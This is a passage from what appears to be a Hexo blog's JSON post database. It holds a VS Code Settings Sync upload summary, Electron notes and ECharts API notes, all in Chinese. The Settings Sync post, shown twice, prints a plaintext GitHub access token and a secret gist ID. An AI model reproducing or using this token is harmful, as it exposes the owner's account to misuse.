href=\"#Version-3-0-0\" class=\"headerlink\" title=\"Version: 3.0.0\"></a>Version: 3.0.0</h2><p>GitHub Token: c875cc3b573265d55bdbe57a23d554ce9e83cde2<br>GitHub Gist: daeb8021fc8862ba3a1fe162cc301c7c<br>GitHub Gist Type: Secret</p>\n<h2 id=\"Restarting-Visual-Studio-Code-may-be-required-to-apply-color-and-file-icon-theme\"><a href=\"#Restarting-Visual-Studio-Code-may-be-required-to-apply-color-and-file-icon-theme\" class=\"headerlink\" title=\"Restarting Visual Studio Code may be required to apply color and file icon theme.\"></a>Restarting Visual Studio Code may be required to apply color and file icon theme.</h2><p>Files Uploaded:<br>  javascript.json &gt; snippets|javascript.json</p>\n<p>Extensions Ignored:<br>  No extensions ignored.</p>\n<p>Extensions Removed:<br>  No extensions removed.</p>\n<p>Extensions Added:<br>  Angular2 v6.1.5<br>  background v1.1.19<br>  beautify v1.3.2<br>  bracket-pair-colorizer v1.0.59<br>  code-gnu-global v0.2.2<br>  code-settings-sync v3.0.0<br>  cpptools v0.17.7<br>  ejs-language-support v0.0.1<br>  ejs-snippets v0.1.0<br>  git-project-manager v1.6.1<br>  githistory v0.4.2<br>  gitlens v8.5.4<br>  html-snippets v0.2.1<br>  java v0.29.0<br>  javascript-ejs-support v0.3.2<br>  JavaScriptSnippets v1.7.0<br>  jquerysnippets v0.0.1<br>  language-stylus v1.9.2<br>  markdown-all-in-one v1.6.0<br>  mongoose-os-ide v0.3.0<br>  mssql v1.4.0<br>  node-module-intellisense v1.5.0<br>  npm-intellisense v1.3.0<br>  python v2018.7.1<br>  Theme-MarkdownKit v0.1.4<br>  tslint v1.0.34<br>  vetur v0.12.6<br>  view-in-browser v0.0.5<br>  vscode-eslint v1.4.12<br>  vscode-great-icons v2.1.41<br>  vscode-html-css v0.2.0<br>  vscode-icons v7.25.0<br>  vscode-java-debug v0.11.0<br>  vscode-language-babel v0.0.20<br>  vscode-language-pack-zh-hans v1.25.3<br>  vscode-map-preview v0.4.2<br>  vscode-maven v0.10.0<br>  vscode-mongodb v0.0.2<br>  vscode-npm-script v0.3.5<br>  vscode-preview-server v1.0.1<br>  vue-vscode-snippets v1.3.0<br>  weex v0.4.0</p>\n<h2 id=\"xml-v2-3-1\"><a href=\"#xml-v2-3-1\" class=\"headerlink\" title=\"  xml v2.3.1\"></a>  xml v2.3.1</h2><p>Done.</p>\n","site":{"data":{}},"excerpt":"","more":"<p>CODE SETTINGS SYNC UPLOAD SUMMARY</p>\n<h2 id=\"Version-3-0-0\"><a href=\"#Version-3-0-0\" class=\"headerlink\" title=\"Version: 3.0.0\"></a>Version: 3.0.0</h2><p>GitHub Token: c875cc3b573265d55bdbe57a23d554ce9e83cde2<br>GitHub Gist: daeb8021fc8862ba3a1fe162cc301c7c<br>GitHub Gist Type: Secret</p>\n<h2 id=\"Restarting-Visual-Studio-Code-may-be-required-to-apply-color-and-file-icon-theme\"><a href=\"#Restarting-Visual-Studio-Code-may-be-required-to-apply-color-and-file-icon-theme\" class=\"headerlink\" title=\"Restarting Visual Studio Code may be required to apply color and file icon theme.\"></a>Restarting Visual Studio Code may be required to apply color and file icon theme.</h2><p>Files Uploaded:<br>  javascript.json &gt; snippets|javascript.json</p>\n<p>Extensions Ignored:<br>  No extensions ignored.</p>\n<p>Extensions Removed:<br>  No extensions removed.</p>\n<p>Extensions Added:<br>  Angular2 v6.1.5<br>  background v1.1.19<br>  beautify v1.3.2<br>  bracket-pair-colorizer v1.0.59<br>  code-gnu-global v0.2.2<br>  code-settings-sync v3.0.0<br>  cpptools v0.17.7<br>  ejs-language-support v0.0.1<br>  ejs-snippets v0.1.0<br>  git-project-manager v1.6.1<br>  githistory v0.4.2<br>  gitlens v8.5.4<br>  html-snippets v0.2.1<br>  java v0.29.0<br>  javascript-ejs-support v0.3.2<br>  JavaScriptSnippets v1.7.0<br>  jquerysnippets v0.0.1<br>  language-stylus v1.9.2<br>  markdown-all-in-one v1.6.0<br>  mongoose-os-ide v0.3.0<br>  mssql v1.4.0<br>  node-module-intellisense v1.5.0<br>  npm-intellisense v1.3.0<br>  python v2018.7.1<br>  Theme-MarkdownKit v0.1.4<br>  tslint v1.0.34<br>  vetur v0.12.6<br>  view-in-browser v0.0.5<br>  vscode-eslint v1.4.12<br>  vscode-great-icons v2.1.41<br>  vscode-html-css v0.2.0<br>  vscode-icons v7.25.0<br>  vscode-java-debug v0.11.0<br>  vscode-language-babel v0.0.20<br>  vscode-language-pack-zh-hans v1.25.3<br>  vscode-map-preview v0.4.2<br>  vscode-maven v0.10.0<br>  vscode-mongodb v0.0.2<br>  vscode-npm-script v0.3.5<br>  vscode-preview-server v1.0.1<br>  vue-vscode-snippets v1.3.0<br>  weex v0.4.0</p>\n<h2 id=\"xml-v2-3-1\"><a href=\"#xml-v2-3-1\" class=\"headerlink\" title=\"  xml v2.3.1\"></a>  xml v2.3.1</h2><p>Done.</p>\n"},{"title":"Electron学习笔记","date":"2018-05-26T10:07:20.000Z","_content":"## Electron API DEMOS 学习笔记\n\n### 第一章 WINDOWS\n#### 第一节 Create and Manage Windows\n创建新窗口，并管理现有窗口\n\n每个浏览器窗口都是一个单独的进程，称为`renderer`进程。这个过程，像控制应用程序生命周期的主要过程一样，可以完全访问该 Node.js API。\n\n##### 1.1 Create a new window(创建新窗口)\n`BrowserWindow`模块提供了在应用程序中创建新窗口的能力。主进程模块可以通过远程模块从呈现程序中使用，如图所示。\n","source":"_posts/Electron/Electron学习笔记.md","raw":"---\ntitle: Electron学习笔记\ndate: 2018-05-26 18:07:20\ntags: Electron学习笔记\ncategories: Electron\n---\n## Electron API DEMOS 学习笔记\n\n### 第一章 WINDOWS\n#### 第一节 Create and Manage Windows\n创建新窗口，并管理现有窗口\n\n每个浏览器窗口都是一个单独的进程，称为`renderer`进程。这个过程，像控制应用程序生命周期的主要过程一样，可以完全访问该 Node.js API。\n\n##### 1.1 Create a new window(创建新窗口)\n`BrowserWindow`模块提供了在应用程序中创建新窗口的能力。主进程模块可以通过远程模块从呈现程序中使用，如图所示。\n","slug":"Electron/Electron学习笔记","published":1,"updated":"2018-09-05T06:33:18.444Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxv1002yzodvgbyenvs1","content":"<h2 id=\"Electron-API-DEMOS-学习笔记\"><a href=\"#Electron-API-DEMOS-学习笔记\" class=\"headerlink\" title=\"Electron API DEMOS 学习笔记\"></a>Electron API DEMOS 学习笔记</h2><h3 id=\"第一章-WINDOWS\"><a href=\"#第一章-WINDOWS\" class=\"headerlink\" title=\"第一章 WINDOWS\"></a>第一章 WINDOWS</h3><h4 id=\"第一节-Create-and-Manage-Windows\"><a href=\"#第一节-Create-and-Manage-Windows\" class=\"headerlink\" title=\"第一节 Create and Manage Windows\"></a>第一节 Create and Manage Windows</h4><p>创建新窗口，并管理现有窗口</p>\n<p>每个浏览器窗口都是一个单独的进程，称为<code>renderer</code>进程。这个过程，像控制应用程序生命周期的主要过程一样，可以完全访问该 Node.js API。</p>\n<h5 id=\"1-1-Create-a-new-window-创建新窗口\"><a href=\"#1-1-Create-a-new-window-创建新窗口\" class=\"headerlink\" title=\"1.1 Create a new window(创建新窗口)\"></a>1.1 Create a new window(创建新窗口)</h5><p><code>BrowserWindow</code>模块提供了在应用程序中创建新窗口的能力。主进程模块可以通过远程模块从呈现程序中使用，如图所示。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Electron-API-DEMOS-学习笔记\"><a href=\"#Electron-API-DEMOS-学习笔记\" class=\"headerlink\" title=\"Electron API DEMOS 学习笔记\"></a>Electron API DEMOS 学习笔记</h2><h3 id=\"第一章-WINDOWS\"><a href=\"#第一章-WINDOWS\" class=\"headerlink\" title=\"第一章 WINDOWS\"></a>第一章 WINDOWS</h3><h4 id=\"第一节-Create-and-Manage-Windows\"><a href=\"#第一节-Create-and-Manage-Windows\" class=\"headerlink\" title=\"第一节 Create and Manage Windows\"></a>第一节 Create and Manage Windows</h4><p>创建新窗口，并管理现有窗口</p>\n<p>每个浏览器窗口都是一个单独的进程，称为<code>renderer</code>进程。这个过程，像控制应用程序生命周期的主要过程一样，可以完全访问该 Node.js API。</p>\n<h5 id=\"1-1-Create-a-new-window-创建新窗口\"><a href=\"#1-1-Create-a-new-window-创建新窗口\" class=\"headerlink\" title=\"1.1 Create a new window(创建新窗口)\"></a>1.1 Create a new window(创建新窗口)</h5><p><code>BrowserWindow</code>模块提供了在应用程序中创建新窗口的能力。主进程模块可以通过远程模块从呈现程序中使用，如图所示。</p>\n"},{"title":"ECharts学习笔记","date":"2018-10-22T05:46:34.000Z","_content":"# ECharts学习笔记\n## API\nAPI分为 四大类\n['echarts', 'echartsInstance', 'action', 'events']\n  + echarts\n    - init: Function \\\n    创建一个 ECharts 实例，返回 echartsInstance，不能在单个容器上初始化多个 ECharts 实例。\n\n      > (dom, theme?, opts?) => echartsInstance\n    \n    - connect \\\n    多个图表实例实现联动。\n\n    - disconnect \\\n    解除图表实例的联动，如果只需要移除单个实例，可以将通过将该图表实例 group 设为空。\n\n    - dispose \\\n    销毁实例，实例销毁后无法再被使用。\n\n    - getInstanceByDom \\\n    获取 dom 容器上的实例。\n\n    - registerMap \\\n    注册可用的地图，必须在包括 geo 组件或者 map 图表类型的时候才能使用。\n\n    - getMap \\\n    获取已注册的地图，返回的对象类型如下\n\n    - registerTheme \\\n    注册主题，用于初始化实例的时候指定。\n\n    - graphic \\\n    图形相关帮助方法。\n\n      - clipPointsByRect \n      输入一组点，和一个矩形，返回被矩形截取过的点。\n\n      - clipRectByRect \n      输入两个矩形，返回第二个矩形截取第一个矩形的结果。\n\n      注意：如果矩形完全被截干净，会返回 undefined。\n\n  + echartsInstance \\\n    通过 echarts.init 创建的实例。\n    - group \\\n    图表的分组，用于`联动`\n\n    - setOption !\\\n    设置图表实例的配置项以及数据，**`万能接口`**，所有参数和数据的修改都可以通过setOption完成，ECharts 会合并新的参数和数据，然后刷新图表。\\\n    如开启动画，ECharts 找到两组数据之间的差异然后通过合适的动画去表现数据的变化。\n\n      注： ECharts 2.x 中的通过 `addData` , `setSeries` 方法设置配置项的方式将不再支持，在 ECharts 3 中统一使用`setOption`，可参考示例。\n      \n      ````\n      chart.setOption(option, notMerge, lazyUpdate);\n      \n      chart.setOption(option, {\n          notMerge: ...,\n          lazyUpdate: ...,\n          silent: ...\n      });\n      ````\n    \n    - getWidth \\\n    获取 ECharts 实例容器的宽度。\n    () => number\n\n    - getHeight \\\n    获取 ECharts 实例容器的高度。\n    () => number\n\n    - getDom \\\n    获取 ECharts 实例容器的 dom 节点。\n\n    - getOption \\\n    获取当前实例中维护的option对象，返回的option对象中包含了用户多次setOption合并得到的配置项和数据，也记录了用户交互的状态 \\\n    例如图例的开关，数据区域缩放选择的范围等等。所以从这份 option 可以恢复或者得到一个新的一模一样的实例。 \\\n    注意：返回的 option 每个组件的属性值都统一是一个`数组`，不管setOption传进来的时候是单个组件的对象还是多个组件的数组。 \\\n    推荐通过setOption去修改部分配置。\n\n    - resize \\\n    改变图表尺寸，在容器大小发生改变时需要手动调用。\n\n    - dispatchAction \\\n    触发图表行为，例如图例开关`legendToggleSelect`, 数据区域缩放`dataZoom`，显示提示框`showTip`等等，更多见 `action` 和 `events` 的文档。\n\n    - on \\\n    绑定事件处理函数。 \\\n    ECharts 中的事件有两种，1、鼠标事件，在鼠标点击某个图形上会触发， 2、调用 dispatchAction 后触发的事件。具体见 action 和 events 的文档。 \\\n    参数 [eventName, query]\n\n    - off \\\n    解绑事件处理函数。 \\\n    参数 [eventName, handler]\n\n    - convertToPixel \\\n    转换坐标系上的点到像素坐标值。\n\n    - convertFromPixel \\\n    转换像素坐标值到逻辑坐标系上的点。是 convertToPixel 的逆运算。 \n\n    - containPixel \\\n    判断给定的点是否在指定的坐标系或者系列上。\n\n    - showLoading \\\n    显示加载动画效果。可以在加载数据前手动调用改接口显示加载动画，在数据加载完成后调用 hideLoading 隐藏加载动画。\n\n    - hideLoading \\\n    隐藏动画加载效果。\n\n    - getDataURL \\\n    导出图表图片，返回一个 base64 的 URL，可以设置为Image的src。\n\n    - getConnectedDataURL \\\n    导出联动的图表图片，返回一个 base64 的 url，可以设置为Image的src。导出图片中每个图表的相对位置跟容器的相对位置有关。\n\n    - appendData \\\n    此接口用于，在大数据量（百万以上）的渲染场景，分片加载数据和增量渲染。在大数据量的场景下（例如地理数的打点），就算数据使用二进制格式，也会有几十或上百兆，在互联网环境下，往往需要分片加载。appendData 接口提供了分片加载后增量渲染的能力，渲染新加如的数据块时不会清除原有已经渲染的部分。\n\n    - clear \\\n    清空当前实例，会移除实例中所有的组件和图表。清空后调用 getOption 方法返回一个{}空对象。\n\n    - isDisposed \\\n    当前实例是否已经被释放。\n\n    - dispose \\\n    销毁实例，销毁后实例无法再被使用。\n\n  + action \\\n  ECharts 中支持的图表行为，通过 dispatchAction 触发。 \\\n  注： 代码中的 ?: 表示该属性是可选的。EVENT: 是 action 对应触发的事件。\n\n    - highlight \\\n    高亮指定的数据图形。 \\\n    通过`seriesName`或者`seriesIndex`指定系列。如果要再指定某个数据可以再指定`dataIndex`或者`name`。\n\n    - downplay \\\n    取消高亮指定的数据图形。\n\n    - legend \\\n    图例组件相关的行为，必须引入图例组件后才能使用。\n\n      - legendSelect \\\n      选中图例。\n\n      - legendUnSelect \\\n      取消选中图例。\n\n      - legendToggleSelect \\\n      切换图例的选中状态。\n\n      - legendScroll \\\n      控制图例的滚动。当 legend.type 为 'scroll' 时有效。\n\n    - tooltip \\\n    提示框组件相关的行为，必须引入提示框组件后才能使用。\n\n      - showTip \\\n      显示提示框。\n\n      - hideTip \\\n      隐藏提示框。\n\n    - dataZoom \\\n    数据区域缩放组件相关的行为，必须引入数据区域缩放组件后才能使用。\n\n      - dataZoom \\\n      数据区域缩放。\n\n    - visualMap \\\n    视觉映射组件相关的行为，必须引入视觉映射组件后才能使用。\n\n      - selectDataRange \\\n      选取映射的数值范围。\n\n    - timeline \\\n    时间轴组件相关的行为，必须引入时间轴组件后才能使用。\n\n      - timelineChange \\\n      设置当前的时间点。\n\n      - timelinePlayChange \\\n      切换时间轴的播放状态。\n\n    - toolbox \\\n    工具栏组件相关的行为，必须引入工具栏组件后才能使用。\n\n      - restore \\\n      重置 option。\n\n    - pie \\\n    饼图相关的行为，必须引入饼图后才能使用。\n\n      - pieSelect \\\n      选中指定的饼图扇形。\n\n      - pieUnSelect \\\n      取消选中指定的饼图扇形。\n\n      - pieToggleSelect \\\n      切换指定的饼图扇形选中状态。\n\n    - geo \\\n    地图组件相关的行为，必须引入地图组件后才能使用。\n\n      - geoSelect \\\n      选中指定的地图区域。\n\n      - geoUnSelect \\\n      取消选中指定的地图区域。\n\n      - geoToggleSelect \\\n      切换指定的地图区域选中状态。\n\n    - map \\\n    地图图表相关的行为，必须引入地图图表后才能使用。\n\n      - mapSelect \\\n      选中指定的地图区域。\n\n      - mapUnSelect \\\n      取消选中指定的地图区域。\n\n      - mapToggleSelect \\\n      切换指定的地图区域选中状态。\n\n    - graph \\\n    关系图 相关的行为，必须引入 关系图 后才能使用。\n\n      - focusNodeAdjacency \\\n      将指定的节点以及其所有邻接节点高亮。\n\n      - unfocusNodeAdjacency \\\n      将指定的节点以及其所有邻接节点高亮。\n\n    - brush \\\n    区域选择相关的行为。\n\n      - brush \\\n      触发此 action 可向 echarts 中添加一个或多个选框\n\n  + events \\\n  在 ECharts 中主要通过 on 方法添加事件处理函数，该文档描述了所有 ECharts 的事件列表。 \\\n  ECharts 中的事件分为两种，一种是鼠标事件，在鼠标点击某个图形上会触发，还有一种是 调用 dispatchAction 后触发的事件。\n\n    - 鼠标事件 \\\n    鼠标事件包括`click`，`dblclick`，`mousedown`，`mouseup`，`mouseover`，`mouseout`，`globalout`，`contextmenu`。\n    参见 [ECharts 中的事件和行为](http://echarts.baidu.com/tutorial.html)\n\n    - legendselectchanged \\\n    ACTION: legendToggleSelect 切换图例选中状态后的事件。\n    注：图例组件用户切换图例开关会触发该事件。\n\n    - legendselected \\\n    ACTION: legendSelect 图例选中后的事件。\n\n    - legendunselected \\\n    ACTION: legendUnSelect 图例取消选中后的事件。\n\n    - legendscroll \\\n    ACTION: legendscroll 图例滚动事件。 \n\n    - datazoom \\\n    ACTION: dataZoom  \n    数据区域缩放后的事件。\n\n    - datarangeselected \\\n    ACTION: selectDataRange 视觉映射组件中，range 值改变后触发的事件。\n\n    - timelinechanged \\\n    ACTION: timelineChange 时间轴中的时间点改变后的事件。\n\n    - timelineplaychanged \\\n    ACTION: timelinePlayChange 时间轴中播放状态的切换事件。\n\n    - restore \\\n    ACTION: restore 重置 option 事件。\n\n    - dataviewchanged \\\n    工具栏中数据视图的修改事件。\n\n    - magictypechanged \\\n    工具栏中动态类型切换的切换事件。\n\n    - geoselectchanged \\\n    ACTION: geoToggleSelect \\\n    geo 中地图区域切换选中状态的事件。\n\n    - geoselected \\\n    ACTION: geoSelect \\\n    geo 中地图区域选中后的事件。\n\n    - geounselected \\\n    ACTION: geoUnSelect  \n    geo 中地图区域取消选中后的事件。\n\n    - pieselectchanged \\\n    ACTION: pieToggleSelect\n    series-pie 中饼图扇形切换选中状态的事件。\n\n    - pieselected \\\n    ACTION: pieSelect\n    series-pie 中饼图扇形选中后的事件。\n    使用dispatchAction可触发此事件，用户点击不会触发此事件（用户点击事件请使用 pieselectchanged）。\n\n    - pieunselected \\\n    ACTION: pieUnSelect\n    series-pie 中饼图扇形取消选中后的事件。\n\n    - mapselectchanged \\\n    ACTION: mapToggleSelect\n    series-map 中地图区域切换选中状态的事件。  \n    用户点击选中会触发该事件。\n\n    - mapselected \\\n    ACTION: mapSelect\n    series-map 中地图区域选中后的事件。\n\n## 配置项\n\n## formatter \n````\naxisLabel: {\n  interval: 0,\n  formatter:function(value){\n    // 拼接加\\n返回的类目项\n    var ret = \"\"; \n\n    // 一行显示文字个数\n    var maxLength = 2; \n    \n    // X轴类 当前项 文字长度\n    var valLength = value.length; \n\n    // 类目项需要换行的行数\n    var rowN = Math.ceil(valLength / maxLength); \n    \n    //如果类目项的文字大于3\n    if (rowN > 1) {\n      for (var i = 0; i < rowN; i++) {\n        var temp = \"\"; // 每次截取的字符串\n        var start = i * maxLength; // 开始截取的位置\n        var end = start + maxLength; // 结束截取的位置\n        //这里也可以加一个是否是最后一行的判断，但是不加也没有影响，那就不加吧\n        temp = value.substring(start, end) + \"\\n\";\n        ret += temp; // 凭借最终的字符串\n      }\n      return ret;\n    } else {\n        return value;\n    }\n  }\n}\n````\n\n\n","source":"_posts/FrontEnd/ECharts学习笔记.md","raw":"---\ntitle: ECharts学习笔记\ndate: 2018-10-22 13:46:34\ntags: ECharts4.0\ncategories: ECharts\n---\n# ECharts学习笔记\n## API\nAPI分为 四大类\n['echarts', 'echartsInstance', 'action', 'events']\n  + echarts\n    - init: Function \\\n    创建一个 ECharts 实例，返回 echartsInstance，不能在单个容器上初始化多个 ECharts 实例。\n\n      > (dom, theme?, opts?) => echartsInstance\n    \n    - connect \\\n    多个图表实例实现联动。\n\n    - disconnect \\\n    解除图表实例的联动，如果只需要移除单个实例，可以将通过将该图表实例 group 设为空。\n\n    - dispose \\\n    销毁实例，实例销毁后无法再被使用。\n\n    - getInstanceByDom \\\n    获取 dom 容器上的实例。\n\n    - registerMap \\\n    注册可用的地图，必须在包括 geo 组件或者 map 图表类型的时候才能使用。\n\n    - getMap \\\n    获取已注册的地图，返回的对象类型如下\n\n    - registerTheme \\\n    注册主题，用于初始化实例的时候指定。\n\n    - graphic \\\n    图形相关帮助方法。\n\n      - clipPointsByRect \n      输入一组点，和一个矩形，返回被矩形截取过的点。\n\n      - clipRectByRect \n      输入两个矩形，返回第二个矩形截取第一个矩形的结果。\n\n      注意：如果矩形完全被截干净，会返回 undefined。\n\n  + echartsInstance \\\n    通过 echarts.init 创建的实例。\n    - group \\\n    图表的分组，用于`联动`\n\n    - setOption !\\\n    设置图表实例的配置项以及数据，**`万能接口`**，所有参数和数据的修改都可以通过setOption完成，ECharts 会合并新的参数和数据，然后刷新图表。\\\n    如开启动画，ECharts 找到两组数据之间的差异然后通过合适的动画去表现数据的变化。\n\n      注： ECharts 2.x 中的通过 `addData` , `setSeries` 方法设置配置项的方式将不再支持，在 ECharts 3 中统一使用`setOption`，可参考示例。\n      \n      ````\n      chart.setOption(option, notMerge, lazyUpdate);\n      \n      chart.setOption(option, {\n          notMerge: ...,\n          lazyUpdate: ...,\n          silent: ...\n      });\n      ````\n    \n    - getWidth \\\n    获取 ECharts 实例容器的宽度。\n    () => number\n\n    - getHeight \\\n    获取 ECharts 实例容器的高度。\n    () => number\n\n    - getDom \\\n    获取 ECharts 实例容器的 dom 节点。\n\n    - getOption \\\n    获取当前实例中维护的option对象，返回的option对象中包含了用户多次setOption合并得到的配置项和数据，也记录了用户交互的状态 \\\n    例如图例的开关，数据区域缩放选择的范围等等。所以从这份 option 可以恢复或者得到一个新的一模一样的实例。 \\\n    注意：返回的 option 每个组件的属性值都统一是一个`数组`，不管setOption传进来的时候是单个组件的对象还是多个组件的数组。 \\\n    推荐通过setOption去修改部分配置。\n\n    - resize \\\n    改变图表尺寸，在容器大小发生改变时需要手动调用。\n\n    - dispatchAction \\\n    触发图表行为，例如图例开关`legendToggleSelect`, 数据区域缩放`dataZoom`，显示提示框`showTip`等等，更多见 `action` 和 `events` 的文档。\n\n    - on \\\n    绑定事件处理函数。 \\\n    ECharts 中的事件有两种，1、鼠标事件，在鼠标点击某个图形上会触发， 2、调用 dispatchAction 后触发的事件。具体见 action 和 events 的文档。 \\\n    参数 [eventName, query]\n\n    - off \\\n    解绑事件处理函数。 \\\n    参数 [eventName, handler]\n\n    - convertToPixel \\\n    转换坐标系上的点到像素坐标值。\n\n    - convertFromPixel \\\n    转换像素坐标值到逻辑坐标系上的点。是 convertToPixel 的逆运算。 \n\n    - containPixel \\\n    判断给定的点是否在指定的坐标系或者系列上。\n\n    - showLoading \\\n    显示加载动画效果。可以在加载数据前手动调用改接口显示加载动画，在数据加载完成后调用 hideLoading 隐藏加载动画。\n\n    - hideLoading \\\n    隐藏动画加载效果。\n\n    - getDataURL \\\n    导出图表图片，返回一个 base64 的 URL，可以设置为Image的src。\n\n    - getConnectedDataURL \\\n    导出联动的图表图片，返回一个 base64 的 url，可以设置为Image的src。导出图片中每个图表的相对位置跟容器的相对位置有关。\n\n    - appendData \\\n    此接口用于，在大数据量（百万以上）的渲染场景，分片加载数据和增量渲染。在大数据量的场景下（例如地理数的打点），就算数据使用二进制格式，也会有几十或上百兆，在互联网环境下，往往需要分片加载。appendData 接口提供了分片加载后增量渲染的能力，渲染新加如的数据块时不会清除原有已经渲染的部分。\n\n    - clear \\\n    清空当前实例，会移除实例中所有的组件和图表。清空后调用 getOption 方法返回一个{}空对象。\n\n    - isDisposed \\\n    当前实例是否已经被释放。\n\n    - dispose \\\n    销毁实例，销毁后实例无法再被使用。\n\n  + action \\\n  ECharts 中支持的图表行为，通过 dispatchAction 触发。 \\\n  注： 代码中的 ?: 表示该属性是可选的。EVENT: 是 action 对应触发的事件。\n\n    - highlight \\\n    高亮指定的数据图形。 \\\n    通过`seriesName`或者`seriesIndex`指定系列。如果要再指定某个数据可以再指定`dataIndex`或者`name`。\n\n    - downplay \\\n    取消高亮指定的数据图形。\n\n    - legend \\\n    图例组件相关的行为，必须引入图例组件后才能使用。\n\n      - legendSelect \\\n      选中图例。\n\n      - legendUnSelect \\\n      取消选中图例。\n\n      - legendToggleSelect \\\n      切换图例的选中状态。\n\n      - legendScroll \\\n      控制图例的滚动。当 legend.type 为 'scroll' 时有效。\n\n    - tooltip \\\n    提示框组件相关的行为，必须引入提示框组件后才能使用。\n\n      - showTip \\\n      显示提示框。\n\n      - hideTip \\\n      隐藏提示框。\n\n    - dataZoom \\\n    数据区域缩放组件相关的行为，必须引入数据区域缩放组件后才能使用。\n\n      - dataZoom \\\n      数据区域缩放。\n\n    - visualMap \\\n    视觉映射组件相关的行为，必须引入视觉映射组件后才能使用。\n\n      - selectDataRange \\\n      选取映射的数值范围。\n\n    - timeline \\\n    时间轴组件相关的行为，必须引入时间轴组件后才能使用。\n\n      - timelineChange \\\n      设置当前的时间点。\n\n      - timelinePlayChange \\\n      切换时间轴的播放状态。\n\n    - toolbox \\\n    工具栏组件相关的行为，必须引入工具栏组件后才能使用。\n\n      - restore \\\n      重置 option。\n\n    - pie \\\n    饼图相关的行为，必须引入饼图后才能使用。\n\n      - pieSelect \\\n      选中指定的饼图扇形。\n\n      - pieUnSelect \\\n      取消选中指定的饼图扇形。\n\n      - pieToggleSelect \\\n      切换指定的饼图扇形选中状态。\n\n    - geo \\\n    地图组件相关的行为，必须引入地图组件后才能使用。\n\n      - geoSelect \\\n      选中指定的地图区域。\n\n      - geoUnSelect \\\n      取消选中指定的地图区域。\n\n      - geoToggleSelect \\\n      切换指定的地图区域选中状态。\n\n    - map \\\n    地图图表相关的行为，必须引入地图图表后才能使用。\n\n      - mapSelect \\\n      选中指定的地图区域。\n\n      - mapUnSelect \\\n      取消选中指定的地图区域。\n\n      - mapToggleSelect \\\n      切换指定的地图区域选中状态。\n\n    - graph \\\n    关系图 相关的行为，必须引入 关系图 后才能使用。\n\n      - focusNodeAdjacency \\\n      将指定的节点以及其所有邻接节点高亮。\n\n      - unfocusNodeAdjacency \\\n      将指定的节点以及其所有邻接节点高亮。\n\n    - brush \\\n    区域选择相关的行为。\n\n      - brush \\\n      触发此 action 可向 echarts 中添加一个或多个选框\n\n  + events \\\n  在 ECharts 中主要通过 on 方法添加事件处理函数，该文档描述了所有 ECharts 的事件列表。 \\\n  ECharts 中的事件分为两种，一种是鼠标事件，在鼠标点击某个图形上会触发，还有一种是 调用 dispatchAction 后触发的事件。\n\n    - 鼠标事件 \\\n    鼠标事件包括`click`，`dblclick`，`mousedown`，`mouseup`，`mouseover`，`mouseout`，`globalout`，`contextmenu`。\n    参见 [ECharts 中的事件和行为](http://echarts.baidu.com/tutorial.html)\n\n    - legendselectchanged \\\n    ACTION: legendToggleSelect 切换图例选中状态后的事件。\n    注：图例组件用户切换图例开关会触发该事件。\n\n    - legendselected \\\n    ACTION: legendSelect 图例选中后的事件。\n\n    - legendunselected \\\n    ACTION: legendUnSelect 图例取消选中后的事件。\n\n    - legendscroll \\\n    ACTION: legendscroll 图例滚动事件。 \n\n    - datazoom \\\n    ACTION: dataZoom  \n    数据区域缩放后的事件。\n\n    - datarangeselected \\\n    ACTION: selectDataRange 视觉映射组件中，range 值改变后触发的事件。\n\n    - timelinechanged \\\n    ACTION: timelineChange 时间轴中的时间点改变后的事件。\n\n    - timelineplaychanged \\\n    ACTION: timelinePlayChange 时间轴中播放状态的切换事件。\n\n    - restore \\\n    ACTION: restore 重置 option 事件。\n\n    - dataviewchanged \\\n    工具栏中数据视图的修改事件。\n\n    - magictypechanged \\\n    工具栏中动态类型切换的切换事件。\n\n    - geoselectchanged \\\n    ACTION: geoToggleSelect \\\n    geo 中地图区域切换选中状态的事件。\n\n    - geoselected \\\n    ACTION: geoSelect \\\n    geo 中地图区域选中后的事件。\n\n    - geounselected \\\n    ACTION: geoUnSelect  \n    geo 中地图区域取消选中后的事件。\n\n    - pieselectchanged \\\n    ACTION: pieToggleSelect\n    series-pie 中饼图扇形切换选中状态的事件。\n\n    - pieselected \\\n    ACTION: pieSelect\n    series-pie 中饼图扇形选中后的事件。\n    使用dispatchAction可触发此事件，用户点击不会触发此事件（用户点击事件请使用 pieselectchanged）。\n\n    - pieunselected \\\n    ACTION: pieUnSelect\n    series-pie 中饼图扇形取消选中后的事件。\n\n    - mapselectchanged \\\n    ACTION: mapToggleSelect\n    series-map 中地图区域切换选中状态的事件。  \n    用户点击选中会触发该事件。\n\n    - mapselected \\\n    ACTION: mapSelect\n    series-map 中地图区域选中后的事件。\n\n## 配置项\n\n## formatter \n````\naxisLabel: {\n  interval: 0,\n  formatter:function(value){\n    // 拼接加\\n返回的类目项\n    var ret = \"\"; \n\n    // 一行显示文字个数\n    var maxLength = 2; \n    \n    // X轴类 当前项 文字长度\n    var valLength = value.length; \n\n    // 类目项需要换行的行数\n    var rowN = Math.ceil(valLength / maxLength); \n    \n    //如果类目项的文字大于3\n    if (rowN > 1) {\n      for (var i = 0; i < rowN; i++) {\n        var temp = \"\"; // 每次截取的字符串\n        var start = i * maxLength; // 开始截取的位置\n        var end = start + maxLength; // 结束截取的位置\n        //这里也可以加一个是否是最后一行的判断，但是不加也没有影响，那就不加吧\n        temp = value.substring(start, end) + \"\\n\";\n        ret += temp; // 凭借最终的字符串\n      }\n      return ret;\n    } else {\n        return value;\n    }\n  }\n}\n````\n\n\n","slug":"FrontEnd/ECharts学习笔记","published":1,"updated":"2019-01-28T09:59:20.832Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxv30032zodviirb8z2a","content":"<h1 id=\"ECharts学习笔记\"><a href=\"#ECharts学习笔记\" class=\"headerlink\" title=\"ECharts学习笔记\"></a>ECharts学习笔记</h1><h2 id=\"API\"><a href=\"#API\" class=\"headerlink\" title=\"API\"></a>API</h2><p>API分为 四大类<br>[‘echarts’, ‘echartsInstance’, ‘action’, ‘events’]</p>\n<ul>\n<li><p>echarts</p>\n<ul>\n<li><p>init: Function \\<br>创建一个 ECharts 实例，返回 echartsInstance，不能在单个容器上初始化多个 ECharts 实例。</p>\n<blockquote>\n<p>(dom, theme?, opts?) =&gt; echartsInstance</p>\n</blockquote>\n</li>\n<li><p>connect \\<br>多个图表实例实现联动。</p>\n</li>\n<li><p>disconnect \\<br>解除图表实例的联动，如果只需要移除单个实例，可以将通过将该图表实例 group 设为空。</p>\n</li>\n<li><p>dispose 